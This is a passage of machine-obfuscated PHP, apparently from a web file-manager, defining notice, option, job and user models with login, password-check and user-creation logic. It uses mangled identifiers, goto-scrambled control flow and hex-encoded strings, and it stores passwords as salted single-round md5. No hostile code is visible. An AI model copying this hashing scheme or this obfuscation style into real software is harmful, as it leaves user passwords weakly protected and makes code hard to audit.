Cñ¤çŒ÷‚; Cñ¤çŒ÷‚: $F˜ËÄØÉ¢Ü = $F˜ËÄØÉ¢Ü ? $F˜ËÄØÉ¢Ü : 0; $fœ¥—Äïëù[$cˆ¸÷å¹èç[368]] = ++$F˜ËÄØÉ¢Ü; $fœ¥—Äïëù[$cˆ¸÷å¹èç[186]] = time(); goto aß¶èÆª­; e¹«àˆ–Ø: return $F˜ËÄØÉ¢Ü; goto E«•ÎÕéÆ; aß¶èÆª­: $fœ¥—Äïëù[$cˆ¸÷å¹èç[105]] = time(); Model($this->modelType)->set($cˆ¸÷å¹èç[366], $F˜ËÄØÉ¢Ü, $this->optionType . $cˆ¸÷å¹èç[367]); Model($this->modelType)->set($cˆ¸÷å¹èç[365] . $F˜ËÄØÉ¢Ü, $fœ¥—Äïëù, $this->optionType); goto e¹«àˆ–Ø; E«•ÎÕéÆ: } public function update($aÛÒ°šÔñ , $A¿°ÂÙ‡Ï×) { goto bŒ­èñ§Ö; CŞâ“øÁô: return Model($this->modelType)->set($aÄ’÷‘œ“[365] . $aÛÒ°šÔñ , $A¿°ÂÙ‡Ï×, $this->optionType); goto eÂ¼ƒÀƒÔ™; Cº…¢è„Ã: if (!$CÉ¨ÄàÕöÄ) { return !1; } $A¿°ÂÙ‡Ï× = array_merge($CÉ¨ÄàÕöÄ, $A¿°ÂÙ‡Ï×); $A¿°ÂÙ‡Ï×[$aÄ’÷‘œ“[105]] = time(); goto CŞâ“øÁô; bŒ­èñ§Ö: $aÄ’÷‘œ“ =& $_SERVER[İåâé¾]; $A¿°ÂÙ‡Ï× = array_field_key($A¿°ÂÙ‡Ï×, $this->field); $CÉ¨ÄàÕöÄ = $this->listData($aÛÒ°šÔñ ); goto Cº…¢è„Ã; eÂ¼ƒÀƒÔ™: } public function remove($fÖ†ŸğÑÛ) { return Model($this->modelType)->remove($_SERVER[İåâé¾][365] . $fÖ†ŸğÑÛ, $this->optionType); } public function clear() { $d°øåâ‰ã‡ =& $_SERVER[İåâé¾]; Model($this->modelType)->remove($d°øåâ‰ã‡[366], $this->optionType . $d°øåâ‰ã‡[367]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($f‚µ°ŸóƒÖ, $eˆÅÆÓ¸Óš) { if (!$eˆÅÆÓ¸Óš) { return !1; } $dáÉ„×é¶Ù = $this->listData(); $dáÉ„×é¶Ù = array_to_keyvalue($dáÉ„×é¶Ù, $f‚µ°ŸóƒÖ); return isset($dáÉ„×é¶Ù[$eˆÅÆÓ¸Óš]) ? $dáÉ„×é¶Ù[$eˆÅÆÓ¸Óš] : !1; } public function findByName($fì±¬Şìµ) { return $this->findByKey($_SERVER[İåâé¾][28], $fì±¬Şìµ); } protected function resetData($a¾åéšöÔ¥) { $c¡õ•ÒĞ¸ù =& $_SERVER[İåâé¾]; $eÕÓ†Áİï = array(); for ($b¹¨ÍèÏ‘œ = 0; $b¹¨ÍèÏ‘œ < count($a¾åéšöÔ¥); $b¹¨ÍèÏ‘œ++) { $eÕÓ†Áİï[$c¡õ•ÒĞ¸ù[365] . $a¾åéšöÔ¥[$b¹¨ÍèÏ‘œ][$c¡õ•ÒĞ¸ù[368]]] = $a¾åéšöÔ¥[$b¹¨ÍèÏ‘œ]; } return Model($this->modelType)->set($eÕÓ†Áİï, !1, $this->optionType); } private function getAutoName($cŠÎĞ ë—¢) { $Fˆåí¨‰ç‰ = array_to_keyvalue(parent::listData(), $_SERVER[İåâé¾][28]); if (!$Fˆåí¨‰ç‰ || !isset($Fˆåí¨‰ç‰[$cŠÎĞ ë—¢])) { return $cŠÎĞ ë—¢; } for ($Eö«•µƒ§Õ = 1; $Eö«•µƒ§Õ < count($Fˆåí¨‰ç‰); $Eö«•µƒ§Õ++) { $cºˆ„ŒÇ¬ = $cŠÎĞ ë—¢ . "\x28{$Eö«•µƒ§Õ}\x29"; if (!isset($Fˆåí¨‰ç‰[$cºˆ„ŒÇ¬])) { return $cºˆ„ŒÇ¬; } } return $cºˆ„ŒÇ¬; } } goto d„Çà¼Âç´; BãñŠÚ×½: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\x2e\x6e\157\x74\x69\x63\145\114\x69\x73\x74"; public $field = array("\156\141\155\x65", "\x63\x6f\x6e\x74\145\x6e\x74", "\x61\x75\x74\x68", "\x6d\x6f\144\x65", "\164\151\155\145", "\x74\x79\x70\x65", "\163\157\x72\164"); public function listData($AÆïˆÎ…… = false, $f®ÈÓ“®øñ = "\163\x6f\x72\164", $AÓ¥å†…“¶ = false) { return parent::listData($AÆïˆÎ……, $f®ÈÓ“®øñ, $AÓ¥å†…“¶); } public function add($eĞˆÂ»Ÿš«) { goto B‰ˆööÅ•Ë; B‰ˆööÅ•Ë: $AÉ×“š•Èë =& $_SERVER[İåâé¾]; $a¨¢™àÂë¸ = $this->findByName($eĞˆÂ»Ÿš«[$AÉ×“š•Èë[28]]); if ($a¨¢™àÂë¸) { return !1; } goto B†‰³ÀÍ‰†; B†‰³ÀÍ‰†: $aù¨ßÛ­± = time(); if ($eĞˆÂ»Ÿš«[$AÉ×“š•Èë[12]] == $AÉ×“š•Èë[1895]) { $aù¨ßÛ­± = strtotime($eĞˆÂ»Ÿš«[$AÉ×“š•Èë[189]]); } $eĞˆÂ»Ÿš«[$AÉ×“š•Èë[189]] = $aù¨ßÛ­±; goto cõªç‘ßè„; cõªç‘ßè„: return parent::insert($eĞˆÂ»Ÿš«); goto FåàéäôØ÷; FåàéäôØ÷: } public function update($C½òÚâÒê¨, $Dù“å§£¿ƒ) { goto a³ö¿•«ƒá; E„ô‘—‡: $Dù“å§£¿ƒ[$CÍºÉ¬Ë†[189]] = $Eáëë¤×; return parent::update($C½òÚâÒê¨, $Dù“å§£¿ƒ); goto d½òÅÑœÁô; a³ö¿•«ƒá: $CÍºÉ¬Ë† =& $_SERVER[İåâé¾]; $a¶§øñå’ = $this->listData($C½òÚâÒê¨); $f¼ëßÜÑæ = $this->findByName($Dù“å§£¿ƒ[$CÍºÉ¬Ë†[28]]); goto DáãÔÜ¯ƒ–; DáãÔÜ¯ƒ–: if (!$a¶§øñå’ || $f¼ëßÜÑæ && $f¼ëßÜÑæ[$CÍºÉ¬Ë†[368]] != $a¶§øñå’[$CÍºÉ¬Ë†[368]]) { return !1; } $Eáëë¤× = time(); if ($Dù“å§£¿ƒ[$CÍºÉ¬Ë†[12]] == $CÍºÉ¬Ë†[1895]) { $Eáëë¤× = strtotime($Dù“å§£¿ƒ[$CÍºÉ¬Ë†[189]]); } goto E„ô‘—‡; d½òÅÑœÁô: } public function remove($D—ò‰¥æ’–) { $CÅÑ•¶ìÛ« = $this->listData($D—ò‰¥æ’–); if (!$CÅÑ•¶ìÛ« || $CÅÑ•¶ìÛ«[$_SERVER[İåâé¾][822]]) { return !1; } return parent::remove($D—ò‰¥æ’–); } public function sort($Dá©–ÄŠÄ, $EÎÏğŠğØ) { return parent::update($Dá©–ÄŠÄ, $EÎÏğŠğØ); } private function initUserOption() { $aŸ±ŒÇ½¯  =& $_SERVER[İåâé¾]; $this->optionType = $aŸ±ŒÇ½¯ [1896]; $this->modelType = $aŸ±ŒÇ½¯ [1897]; $this->field = array($aŸ±ŒÇ½¯ [1898], $aŸ±ŒÇ½¯ [28], $aŸ±ŒÇ½¯ [189], $aŸ±ŒÇ½¯ [29], $aŸ±ŒÇ½¯ [446], $aŸ±ŒÇ½¯ [179]); } public function userNoticeGet($AãŠ÷£‰¯Å = false) { $this->initUserOption(); return parent::listData($AãŠ÷£‰¯Å, $_SERVER[İåâé¾][368], !0); } public function userNoticeAdd($Aœ‘óŞˆŒ) { $A´–„œ¹ŸÃ =& $_SERVER[İåâé¾]; $this->initUserOption(); $bÕ ï•Œ¤½ = $this->findByKey($A´–„œ¹ŸÃ[1898], $Aœ‘óŞˆŒ[$A´–„œ¹ŸÃ[368]]); if ($bÕ ï•Œ¤½) { return !0; } $FØ¼¦¸œñ¨ = array($A´–„œ¹ŸÃ[1898] => $Aœ‘óŞˆŒ[$A´–„œ¹ŸÃ[368]], $A´–„œ¹ŸÃ[28] => $Aœ‘óŞˆŒ[$A´–„œ¹ŸÃ[28]], $A´–„œ¹ŸÃ[189] => $Aœ‘óŞˆŒ[$A´–„œ¹ŸÃ[189]], $A´–„œ¹ŸÃ[29] => isset($Aœ‘óŞˆŒ[$A´–„œ¹ŸÃ[29]]) ? $Aœ‘óŞˆŒ[$A´–„œ¹ŸÃ[29]] : 1, $A´–„œ¹ŸÃ[446] => 0, $A´–„œ¹ŸÃ[179] => 0); return parent::insert($FØ¼¦¸œñ¨); } public function userNoticeEdit($D‚Ã‰‚ˆ¤™, $C›—œ¾…Ú) { $this->initUserOption(); return parent::update($D‚Ã‰‚ˆ¤™, $C›—œ¾…Ú); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\164\x65\x6d\x5f\157\160\x74\151\x6f\x6e"; protected $jsonField = array("\155\x65\x6e\165", "\162\157\x6c\145", "\162\157\x6c\x65\107\162\157\165\x70", "\162\x65\147\x69\x73\x74", "\x65\x6d\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($dŞÈŠŒîÇ) { return "\123\x79\163\x74\x65\155\x4f\x70\164\x69\x6f\x6e\x5f{$dŞÈŠŒîÇ}"; } } class SystemRecordModel extends ModelBaseLight { } goto E¶Ü¢×ÛÒ‚; cÍ™“Ì¥¹: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\56\152\157\142\x4c\151\x73\164"; public $field = array("\156\x61\155\145", "\144\145\163\143", "\163\x6f\162\x74"); const JOB_KEY = "\163\145\x6c\x66\112\157\142\114\x69\163\x74"; public function listData($Bãó±Ú = false, $D•Æñº£À‘ = "\163\157\162\x74", $BËïß·çâ” = false) { return parent::listData($Bãó±Ú, $D•Æñº£À‘, $BËïß·çâ”); } public function remove($DØáÒåÉêÂ) { return parent::remove($DØáÒåÉêÂ); } public function add($cŠ„¼¨š…Ş) { $dï‹Í…ÇÅí =& $_SERVER[İåâé¾]; if ($this->findByName($cŠ„¼¨š…Ş[$dï‹Í…ÇÅí[28]])) { return !1; } $cŠ„¼¨š…Ş[$dï‹Í…ÇÅí[1563]] = $this->getSort(); return parent::insert($cŠ„¼¨š…Ş); } private function getSort() { $Dš°‡‚ç½¬ =& $_SERVER[İåâé¾]; $Cƒ‚œ“Øà = parent::listData(); $bÚŒóéÊèË = array_to_keyvalue($Cƒ‚œ“Øà, $Dš°‡‚ç½¬[33], $Dš°‡‚ç½¬[1563]); return empty($bÚŒóéÊèË) ? 0 : max($bÚŒóéÊèË) + 1; } public function update($D‘‘ñ¹ŒÅ, $cÖ®¬ß¸ææ) { $Eæä“¥áÉø =& $_SERVER[İåâé¾]; $a®„ÒñõÔ‡ = parent::listData($D‘‘ñ¹ŒÅ); $eš½‰Æ¡ò” = $this->findByName($cÖ®¬ß¸ææ[$Eæä“¥áÉø[28]]); if (!$a®„ÒñõÔ‡ || $eš½‰Æ¡ò” && $eš½‰Æ¡ò”[$Eæä“¥áÉø[368]] != $a®„ÒñõÔ‡[$Eæä“¥áÉø[368]]) { return !1; } return parent::update($D‘‘ñ¹ŒÅ, $cÖ®¬ß¸ææ); } public function setUserJob($c”Ùø÷ãŠÂ, $DÅ¼®Æ¢ì) { goto FÆÛÎÕ ¼Û; FÆÛÎÕ ¼Û: $b³œù×‚ŒÍ =& $_SERVER[İåâé¾]; if (!is_array($DÅ¼®Æ¢ì)) { $DÅ¼®Æ¢ì = array($DÅ¼®Æ¢ì); } $cŞ„êè¬ = parent::listData(); goto b¬ğ¤À²‰; b¬ğ¤À²‰: $eÈ Ò³„“ = array_to_keyvalue($cŞ„êè¬, $b³œù×‚ŒÍ[28]); $BåôõÜÏÁ‚ = $b³œù×‚ŒÍ[363]; foreach ($DÅ¼®Æ¢ì as $FĞĞ­é¬‰Ø) { if ($eÈ Ò³„“[$FĞĞ­é¬‰Ø]) { $BåôõÜÏÁ‚ .= $eÈ Ò³„“[$FĞĞ­é¬‰Ø][$b³œù×‚ŒÍ[368]] . $b³œù×‚ŒÍ[47]; } else { $bãíÑÌÔò = $this->add($FĞĞ­é¬‰Ø); $BåôõÜÏÁ‚ .= $bãíÑÌÔò . $b³œù×‚ŒÍ[47]; } } goto D²îååè†‚; D²îååè†‚: $BåôõÜÏÁ‚ = rtrim($BåôõÜÏÁ‚, $b³œù×‚ŒÍ[47]); Model($b³œù×‚ŒÍ[1477])->metaSet($c”Ùø÷ãŠÂ, self::JOB_KEY, $BåôõÜÏÁ‚); goto dÆ·Ê·¶ù; dÆ·Ê·¶ù: } public function getUserJob($cŞ²ßñööì) { $d”¥¡Í°•ê = Model($_SERVER[İåâé¾][1477])->metaGet($cŞ²ßñööì); return $this->getUserJobInfo($d”¥¡Í°•ê[self::JOB_KEY]); } public function getUserJobInfo($F™Ø¡ì˜ù¬) { goto CÇ´Ç‡´øÔ; f£êÖ¥ä¬: return $d‚±ÙèÒáÛ; goto cï¢äâÍùê; CÙìĞõÄ‹¹: $dÔ–ğíçê¹ = array_remove_key($dÔ–ğíçê¹, $F÷èÔÓ†ĞÍ[186]); $d‚±ÙèÒáÛ = array(); foreach ($cÉî£…£èŞ as $B¹·î“±ìá) { if (isset($dÔ–ğíçê¹[$B¹·î“±ìá])) { $d‚±ÙèÒáÛ[] = $dÔ–ğíçê¹[$B¹·î“±ìá]; } } goto f£êÖ¥ä¬; CÇ´Ç‡´øÔ: $F÷èÔÓ†ĞÍ =& $_SERVER[İåâé¾]; $cÉî£…£èŞ = explode($F÷èÔÓ†ĞÍ[47], $F™Ø¡ì˜ù¬); $dÔ–ğíçê¹ = parent::listData(); goto CÙìĞõÄ‹¹; cï¢äâÍùê: } } class UserModel extends ModelBase { protected $tableName = "\165\x73\145\162"; protected $tableMeta = array("\164\x61\x62\154\x65\116\x61\155\x65" => "\165\x73\145\162\137\x6d\x65\164\x61", "\155\x65\x74\x61\106\x69\145\x6c\144" => "\165\163\x65\x72\x49\x44"); protected $simpleField = "\x75\x73\145\x72\111\104\54\x6e\151\143\x6b\x4e\141\155\x65\54\x6e\141\155\x65\54\x61\x76\x61\x74\141\x72\54\x73\x65\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($BÊáÛ—˜¦) { $BîçãŠ‹™ä =& $_SERVER[İåâé¾]; return array($BîçãŠ‹™ä[1618] => array($BÊáÛ—˜¦[0], $BîçãŠ‹™ä[1910]), $BîçãŠ‹™ä[1620] => array($BÊáÛ—˜¦[0], $BîçãŠ‹™ä[1910])); } protected function getInfo($bŠÜÜ¢ó÷, $Cˆ¦×õ÷©Û = false) { $aé­«îá =& $_SERVER[İåâé¾]; $FÑè„ÔÕÈ« = $this->getInfoSimple($bŠÜÜ¢ó÷); if (!is_array($FÑè„ÔÕÈ«)) { return array(); } if ($Cˆ¦×õ÷©Û) { goto c†ˆ™«ÒËª; C¯£ÆÌ¼Ø: $b‘†ùëÛš¼ = Model($aé­«îá[850])->metaGet($FÑè„ÔÕÈ«[$aé­«îá[856]][$aé­«îá[374]]); $FÑè„ÔÕÈ«[$aé­«îá[1913]] = $FÎ•Îì™ ‘; $FÑè„ÔÕÈ«[$aé­«îá[856]][$aé­«îá[1760]] = $b‘†ùëÛš¼[$aé­«îá[1761]]; goto c´‡œÅ°Ë»; c†ˆ™«ÒËª: if (!$FÑè„ÔÕÈ«) { return $FÑè„ÔÕÈ«; } $FÎ•Îì™ ‘ = md5($aé­«îá[1911] . $FÑè„ÔÕÈ«[$aé­«îá[567]] . $aé­«îá[1912] . $FÑè„ÔÕÈ«[$aé­«îá[28]]); $FÑè„ÔÕÈ« = $this->_listDataApplyItem($FÑè„ÔÕÈ«); goto C¯£ÆÌ¼Ø; c´‡œÅ°Ë»: return $FÑè„ÔÕÈ«; goto B´éİË¿Ê”; B´éİË¿Ê”: } return $this->cacheFunctionGet($aé­«îá[1657], $bŠÜÜ¢ó÷); } protected function getInfoSimple($c˜¸¤•ïõ, $c‘‹½Ğã• = false) { $D—ä§öÈÚ =& $_SERVER[İåâé¾]; if (!$c˜¸¤•ïõ) { return array(); } if ($c‘‹½Ğã•) { $DÀ‘Œ”Ö…Â = $this->where(array($D—ä§öÈÚ[1086] => intval($c˜¸¤•ïõ)))->find(); if (!is_array($DÀ‘Œ”Ö…Â)) { return array(); } $DÀ‘Œ”Ö…Â[$D—ä§öÈÚ[1914]] = Action($D—ä§öÈÚ[1915])->parseUrl($DÀ‘Œ”Ö…Â[$D—ä§öÈÚ[1914]]); return $DÀ‘Œ”Ö…Â; } return $this->cacheFunctionGet($D—ä§öÈÚ[1621], $c˜¸¤•ïõ); } protected function getInfoSimpleOuter($aù¬ˆö”÷¯) { goto bö§íŒ½Û†; bö§íŒ½Û†: $bõ•Ò³ŸØï =& $_SERVER[İåâé¾]; if (!$aù¬ˆö”÷¯ || $aù¬ˆö”÷¯ == 0) { return array($bõ•Ò³ŸØï[1086] => $bõ•Ò³ŸØï[402], $bõ•Ò³ŸØï[28] => $bõ•Ò³ŸØï[153] . LNG($bõ•Ò³ŸØï[1916]) . $bõ•Ò³ŸØï[1348], $bõ•Ò³ŸØï[1914] => STATIC_PATH . $bõ•Ò³ŸØï[1917]); } $dƒˆ…·ÉÙÕ = $this->cacheFunctionGet($bõ•Ò³ŸØï[1621], $aù¬ˆö”÷¯); goto då¤Æ¹ˆ°…; C†É¯ã„ÓŒ: return $AÆêïëÚ„; goto C†Ğğç‡£Ü; då¤Æ¹ˆ°…: $AÆêïëÚ„ = array_field_key($dƒˆ…·ÉÙÕ, explode($bõ•Ò³ŸØï[47], $this->simpleField)); if (!$AÆêïëÚ„) { return array($bõ•Ò³ŸØï[1086] => $bõ•Ò³ŸØï[779], $bõ•Ò³ŸØï[28] => $bõ•Ò³ŸØï[153] . LNG($bõ•Ò³ŸØï[1918]) . $bõ•Ò³ŸØï[1348], $bõ•Ò³ŸØï[1914] => STATIC_PATH . $bõ•Ò³ŸØï[1919]); } $AÆêïëÚ„[$bõ•Ò³ŸØï[1914]] = Action($bõ•Ò³ŸØï[1915])->parseUrl($AÆêïëÚ„[$bõ•Ò³ŸØï[1914]]); goto C†É¯ã„ÓŒ; C†Ğğç‡£Ü: } protected function groupUser($dß›Õå¯–ì) { } public static function errorLang($BĞÉ¤¾„Ì) { $aùæÜ¼§¢× =& $_SERVER[İåâé¾]; $aîÈÀš…ƒ = array(self::ERROR_USER_NOT_EXISTS => $aùæÜ¼§¢×[1920], self::ERROR_USER_PASSWORD_ERROR => $aùæÜ¼§¢×[1921], self::ERROR_USER_EXIST_NAME => $aùæÜ¼§¢×[1922], self::ERROR_USER_EXIST_PHONE => $aùæÜ¼§¢×[1923], self::ERROR_USER_EXIST_EMAIL => $aùæÜ¼§¢×[1924], self::ERROR_USER_LOGIN_LOCK => $aùæÜ¼§¢×[1925], self::ERROR_IP_NOT_ALLOW => $aùæÜ¼§¢×[1926], self::ERROR_USER_EXIST_NICKNAME => $aùæÜ¼§¢×[1927]); return LNG($aîÈÀš…ƒ[$BĞÉ¤¾„Ì]); } public function getInfoByMeta($Bª•ó…±Ÿ‡, $AòÙŒ‹øÜÇ) { $DÄ¸äª™ù‘ =& $_SERVER[İåâé¾]; $bš—÷ŠÏÏ = Model($DÄ¸äª™ù‘[1928])->where(array($DÄ¸äª™ù‘[88] => $Bª•ó…±Ÿ‡, $DÄ¸äª™ù‘[359] => $AòÙŒ‹øÜÇ))->find(); if ($bš—÷ŠÏÏ) { return $this->getInfo($bš—÷ŠÏÏ[$DÄ¸äª™ù‘[1086]]); } return !1; } public function userLoginCheck($aô°Š„éª§, $eø×­‰Š©Â) { goto b¬ùƒ™®Ü”; AÔƒ†¥Íãğ: $dŒØÔª¾¼ = $this->where($a„÷ÄÈÈ¹š)->find(); if (!$dŒØÔª¾¼) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($dŒØÔª¾¼[$FØÂ˜¾ÒĞ[1086]], $eø×­‰Š©Â)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto CÊ»õÕ¥´; CÊ»õÕ¥´: $this->userEdit($dŒØÔª¾¼[$FØÂ˜¾ÒĞ[1086]], array($FØÂ˜¾ÒĞ[1931] => time())); $this->clearCache($dŒØÔª¾¼[$FØÂ˜¾ÒĞ[1086]]); return $this->getInfo($dŒØÔª¾¼[$FØÂ˜¾ÒĞ[1086]]); goto E ³¥©–ª; b¬ùƒ™®Ü”: $FØÂ˜¾ÒĞ =& $_SERVER[İåâé¾]; $a„÷ÄÈÈ¹š = array($FØÂ˜¾ÒĞ[28] => $aô°Š„éª§, $FØÂ˜¾ÒĞ[1767] => $aô°Š„éª§, $FØÂ˜¾ÒĞ[296] => $aô°Š„éª§, $FØÂ˜¾ÒĞ[1929] => $aô°Š„éª§, $FØÂ˜¾ÒĞ[680] => $FØÂ˜¾ÒĞ[682]); if (Model($FØÂ˜¾ÒĞ[830])->get($FØÂ˜¾ÒĞ[1930])) { unset($a„÷ÄÈÈ¹š[$FØÂ˜¾ÒĞ[1767]]); } goto AÔƒ†¥Íãğ; E ³¥©–ª: } private function clearCache($f…¬øõóßƒ) { $A†çåÙ´¹á =& $_SERVER[İåâé¾]; $this->cacheFunctionClear($A†çåÙ´¹á[1657], $f…¬øõóßƒ); $this->cacheFunctionClear($A†çåÙ´¹á[1621], $f…¬øõóßƒ); } public function userPasswordCheck($D…ì¦‹êë, $Féš‘ùš„·) { $cåéÄÇÏ =& $_SERVER[İåâé¾]; $B¢³ÙçíÆ† = $this->where(array($cåéÄÇÏ[1086] => intval($D…ì¦‹êë)))->find(); $e™ËÔÅìÏ¤ = $this->metaGet($D…ì¦‹êë); $E”…©¤ô‡ = isset($e™ËÔÅìÏ¤[$cåéÄÇÏ[1932]]) ? $e™ËÔÅìÏ¤[$cåéÄÇÏ[1932]] : $cåéÄÇÏ[33]; if (md5($E”…©¤ô‡ . trim($Féš‘ùš„·)) !== $B¢³ÙçíÆ†[$cåéÄÇÏ[567]]) { return !1; } return !0; } public function userAdd($B‚ºÔŠ¡…º) { goto EƒâÀì©®•; EƒâÀì©®•: $AŞ˜—‡”å† =& $_SERVER[İåâé¾]; $E¨Î»ç§âä = array($AŞ˜—‡”å†[387] => $B‚ºÔŠ¡…º[$AŞ˜—‡”å†[28]], $AŞ˜—‡”å†[1933] => $B‚ºÔŠ¡…º[$AŞ˜—‡”å†[1934]], $AŞ˜—‡”å†[1935] => isset($B‚ºÔŠ¡…º[$AŞ˜—‡”å†[296]]) ? $B‚ºÔŠ¡…º[$AŞ˜—‡”å†[296]] : $AŞ˜—‡”å†[33], $AŞ˜—‡”å†[1936] => isset($B‚ºÔŠ¡…º[$AŞ˜—‡”å†[1929]]) ? $B‚ºÔŠ¡…º[$AŞ˜—‡”å†[1929]] : $AŞ˜—‡”å†[33], $AŞ˜—‡”å†[1937] => isset($B‚ºÔŠ¡…º[$AŞ˜—‡”å†[1767]]) ? $B‚ºÔŠ¡…º[$AŞ˜—‡”å†[1767]] : $B‚ºÔŠ¡…º[$AŞ˜—‡”å†[28]], $AŞ˜—‡”å†[1938] => isset($B‚ºÔŠ¡…º[$AŞ˜—‡”å†[1914]]) ? $B‚ºÔŠ¡…º[$AŞ˜—‡”å†[1914]] : $AŞ˜—‡”å†[33], $AŞ˜—‡”å†[1939] => isset($B‚ºÔŠ¡…º[$AŞ˜—‡”å†[1940]]) ? $B‚ºÔŠ¡…º[$AŞ˜—‡”å†[1940]] : 1, $AŞ˜—‡”å†[1941] => $B‚ºÔŠ¡…º[$AŞ˜—‡”å†[567]], $AŞ˜—‡”å†[1623] => isset($B‚ºÔŠ¡…º[$AŞ˜—‡”å†[1526]]) ? $B‚ºÔŠ¡…º[$AŞ˜—‡”å†[1526]] : 1024 * 1024 * 20, $AŞ˜—‡”å†[1624] => 0, $AŞ˜—‡”å†[1931] => 0, $AŞ˜—‡”å†[1942] => isset($B‚ºÔŠ¡…º[$AŞ˜—‡”å†[446]]) ? $B‚ºÔŠ¡…º[$AŞ˜—‡”å†[446]] : 1); if (!empty($B‚ºÔŠ¡…º[$AŞ˜—‡”å†[1086]])) { $E¨Î»ç§âä[$AŞ˜—‡”å†[1086]] = $B‚ºÔŠ¡…º[$AŞ˜—‡”å†[1086]]; } goto Aæ¾ŠÅ®‚Ë; FïÁè—³œ: return $CõÛ¢‹×³; goto dŠ¨‘è‘ç; Aæ¾ŠÅ®‚Ë: $CÏ¬Ç‡ÏÍ = $this->_checkExist($B‚ºÔŠ¡…º); if ($CÏ¬Ç‡ÏÍ !== !0) { return $CÏ¬Ç‡ÏÍ; } $CõÛ¢‹×³ = $this->add($E¨Î»ç§âä); goto aˆ‰Ô·×ŒÙ; aˆ‰Ô·×ŒÙ: $FÇ¹È±¬Š = array($AŞ˜—‡”å†[1941] => $E¨Î»ç§âä[$AŞ˜—‡”å†[567]], $AŞ˜—‡”å†[1937] => $E¨Î»ç§âä[$AŞ˜—‡”å†[1767]]); $this->userEdit($CõÛ¢‹×³, $FÇ¹È±¬Š); Model($AŞ˜—‡”å†[850])->userRootAdd($CõÛ¢‹×³); goto FïÁè—³œ; dŠ¨‘è‘ç: } protected function userEditTest($b¤’ñÌßŒœ, $a£Øéã­) { return $this->call($_SERVER[İåâé¾][1943], $b¤’ñÌßŒœ, $a£Øéã­); } protected function userEdit($aÏù÷ø¤¹‹, $AŠäÑùˆï†) { goto b…ö‘é©çÚ; aÊÎ½…İÏ­: $eÎÅÓ¤Í’ = $this->_checkExist($AŠäÑùˆï†, $aÏù÷ø¤¹‹); if ($eÎÅÓ¤Í’ !== !0) { return $eÎÅÓ¤Í’; } if (isset($AŠäÑùˆï†[$c½ØÏÙÅ¹[567]]) && trim($AŠäÑùˆï†[$c½ØÏÙÅ¹[567]]) != $c½ØÏÙÅ¹[33]) { $eƒ‰ƒëí–… = $this->metaGet($aÏù÷ø¤¹‹); if (empty($eƒ‰ƒëí–…[$c½ØÏÙÅ¹[1932]])) { $eƒ‰ƒëí–…[$c½ØÏÙÅ¹[1932]] = rand_string(10); Model($c½ØÏÙÅ¹[1713])->metaSet($aÏù÷ø¤¹‹, $c½ØÏÙÅ¹[1932], $eƒ‰ƒëí–…[$c½ØÏÙÅ¹[1932]]); } $AŠäÑùˆï†[$c½ØÏÙÅ¹[567]] = md5($eƒ‰ƒëí–…[$c½ØÏÙÅ¹[1932]] . trim($AŠäÑùˆï†[$c½ØÏÙÅ¹[567]])); } else { unset($AŠäÑùˆï†[$c½ØÏÙÅ¹[567]]); } goto cÜ×àÚÃß’; b…ö‘é©çÚ: $c½ØÏÙÅ¹ =& $_SERVER[İåâé¾]; $BŠ¨µˆã = $this->getInfoSimple($aÏù÷ø¤¹‹); if (!$BŠ¨µˆã) { return !1; } goto aÊÎ½…İÏ­; cÜ×àÚÃß’: $this->where(array($c½ØÏÙÅ¹[1077] => $aÏù÷ø¤¹‹))->save($AŠäÑùˆï†); if (isset($AŠäÑùˆï†[$c½ØÏÙÅ¹[1767]])) { $this->setNamePinyin($aÏù÷ø¤¹‹, $AŠäÑùˆï†[$c½ØÏÙÅ¹[1767]]); } return !0; goto DÉæ‚ÃŒÉ; DÉæ‚ÃŒÉ: } public function setNamePinyin($dë…‘ÜÜì, $DÎ‹›å óë = false) { $Fé½»Öë¬“ =& $_SERVER[İåâé¾]; if (!$DÎ‹›å óë) { $DÔ–Œ³“„¶ = $this->getInfoSimple($dë…‘ÜÜì); $DÎ‹›å óë = $DÔ–Œ³“„¶[$Fé½»Öë¬“[1767]] ? $DÔ–Œ³“„¶[$Fé½»Öë¬“[1767]] : $DÔ–Œ³“„¶[$Fé½»Öë¬“[28]]; } $a®å®¯Ùó‰ = Model($Fé½»Öë¬“[1477]); if (!Input::check($DÎ‹›å óë, $Fé½»Öë¬“[403])) { return $a®å®¯Ùó‰->metaSet($dë…‘ÜÜì, array($Fé½»Öë¬“[404] => null, $Fé½»Öë¬“[405] => null)); } return $a®å®¯Ùó‰->metaSet($dë…‘ÜÜì, array($Fé½»Öë¬“[404] => str_replace($Fé½»Öë¬“[50], $Fé½»Öë¬“[33], Pinyin::encode($DÎ‹›å óë)), $Fé½»Öë¬“[405] => Pinyin::encode($DÎ‹›å óë, $Fé½»Öë¬“[406]))); } private function _checkExist($dÍË÷¶ã‡³, $eŞ‰È†İ¾ = false) { $E„ìÀõì”¹ =& $_SERVER[İåâé¾]; $dÂ–‘¿²¬¹ = array($E„ìÀõì”¹[28] => UserModel::ERROR_USER_EXIST_NAME, $E„ìÀõì”¹[1767] => UserModel::ERROR_USER_EXIST_NICKNAME, $E„ìÀõì”¹[296] => UserModel::ERROR_USER_EXIST_EMAIL, $E„ìÀõì”¹[1929] => UserModel::ERROR_USER_EXIST_PHONE); if (Model($E„ìÀõì”¹[830])->get($E„ìÀõì”¹[1930])) { unset($dÂ–‘¿²¬¹[$E„ìÀõì”¹[1767]]); } $fºíÌì–êÛ = $eŞ‰È†İ¾ ? array($E„ìÀõì”¹[1086] => array($E„ìÀõì”¹[1944], $eŞ‰È†İ¾)) : array(); foreach ($dÂ–‘¿²¬¹ as $B†ËóÎğ•ç => $B‘Ÿ“ÌÛë) { if (!isset($dÍË÷¶ã‡³[$B†ËóÎğ•ç]) || 